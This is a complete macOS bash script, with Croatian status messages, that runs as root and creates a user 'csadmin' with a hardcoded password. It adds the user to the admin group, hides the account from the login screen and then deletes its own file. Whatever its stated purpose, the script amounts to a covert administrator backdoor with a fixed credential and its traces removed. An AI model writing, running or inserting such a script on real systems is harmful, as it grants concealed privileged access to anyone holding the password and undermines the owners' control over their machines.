#!/bin/bash

# Function for script deletion
delete_script() {
    rm -f "$0"
}

# Check if you are logged in as a user with administrative privileges
if [[ $(id -u) -ne 0 ]]; then
    exit 1
fi

# Finding the last ID of an existing user
last_id=$(dscl . -list /Users UniqueID | awk '{print $2}' | sort -n | tail -n 1)

if [[ -z "$last_id" ]]; then
    new_id=1000
else
    # Calculating the ID for the new user
    new_id=$((last_id + 1))
fi

# Enter the details for the new user
username="csadmin"
full_name="CS Admin"
password="2BlindE1"

# Creating the user
echo "Stvaranje korisnika..."
dscl . -create "/Users/$username"
dscl . -create "/Users/$username" UserShell /bin/bash
dscl . -create "/Users/$username" RealName "$full_name"
dscl . -create "/Users/$username" UniqueID "$new_id"
dscl . -create "/Users/$username" PrimaryGroupID 1000
dscl . -create "/Users/$username" NFSHomeDirectory "/Users/$username"
dscl . -passwd "/Users/$username" "$password"

# Adding the user to the administrators group
dseditgroup -o edit -a "$username" -t user admin

# Hiding the user
dscl . -create "/Users/$username" IsHidden 1

#echo "Korisnik $username je uspješno stvoren s ID-om $new_id."

# Calling the function for script deletion after execution
delete_script